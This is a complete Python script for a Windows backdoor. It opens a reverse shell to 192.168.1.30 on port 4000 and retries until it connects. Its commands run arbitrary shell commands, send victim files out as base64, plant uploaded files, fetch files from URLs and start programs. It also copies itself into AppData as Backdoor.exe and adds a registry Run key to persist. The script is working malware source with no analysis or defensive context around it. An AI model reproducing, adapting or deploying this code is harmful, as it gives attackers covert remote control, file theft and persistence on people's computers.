#!/usr/bin/python
import socket
import json
import subprocess
import time
import os
import shutil
import base64
import sys
import requests

		
def reliable_send(data):
	json_data=json.dumps(data)
	sock.send(json_data)

def reliable_recv():
	json_data=""
	while True:
		try:
			json_data+=sock.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue

def is_admin():
	global admin
	try:
		temp=os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
	except:
		admin="User Priviliges"
	else:
		admin="administrator"



def download(url):
	get_response=requests.get(url)
	file_name=url.split("/")[-1]
	with open(file_name,"wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(5)
		try:
			sock.connect(("192.168.1.30",4000))
			shell()
		except:
			connection()

def shell():
	while True :
		command=reliable_recv()
		if command=="q":
			break
		elif command[:4]=="help":
			help_options='''download path	->Download a file from target PC
upload path	->Uploads a file to target PC
get url		-> download a file to target from any website
start path	->start program on target PC
check		->check for administrator priviledges '''
			reliable_send(help_options)
					
		elif command[:2] =="cd" and len(command)>1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8]=="download":
			with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] =="upload":
			with open(command[7:],"wb") as fin:
				result=reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3]=="get":
			try:
				download(command[4:])
				reliable_send("Downloaded file from specified url")
			except:
				reliable_send("failed to download file")
		elif command[:5]=="start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("started")
			except:	
				reliable_send("failed to start")
		elif command[:5]=="check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("cant perform the check")

		else:
			try:
				proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result=proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("can't execute")


location=os.environ["appdata"] + "\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable, location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+location +'"',shell=True)


sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()
